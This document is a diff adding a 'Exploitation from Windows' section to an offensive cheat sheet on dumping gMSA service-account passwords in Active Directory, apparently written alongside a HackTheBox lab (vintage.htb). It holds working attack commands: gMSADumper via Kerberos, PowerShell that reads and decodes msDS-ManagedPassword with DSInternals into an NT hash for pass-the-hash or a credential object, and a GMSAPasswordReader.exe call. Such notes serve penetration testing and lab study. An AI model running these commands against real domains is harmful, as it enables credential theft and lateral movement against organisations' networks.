@@ -25,7 +25,7 @@
  1732621230:L.Bianchi_adm
  1733002326:svc_sql
  ```
-## Exploitation
+## Exploitation from Linux
 ### BloodyAD
  * Getting the hash:
  ```bash
@@ -46,5 +46,23 @@
  
  # With Kerberos
  python3 gMSADumper.py -k -d vintage.htb -l dc01.vintage.htb
+ ```
+## Exploitation from Windows
+### AD and DSInternals
+ ```ps1
+ # Save the blob to a variable
+ $gmsa = Get-ADServiceAccount -Identity 'Target_Account' -Properties 'msDS-ManagedPassword'
+ $mp = $gmsa.'msDS-ManagedPassword'
+
+ # Decode the data structure using the DSInternals module
+ ConvertFrom-ADManagedPasswordBlob $mp
+ # Build a NT-Hash for PTH
+ (ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword | ConvertTo-NTHash
+ # Alterantive: build a Credential-Object with the Plain Password
+ $cred = new-object system.management.automation.PSCredential "Domain\Target_Account",(ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword
+```
+### [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
+ ```ps1
+ .\GMSAPasswordReader.exe --AccountName 'Target_Account'
  ```
 
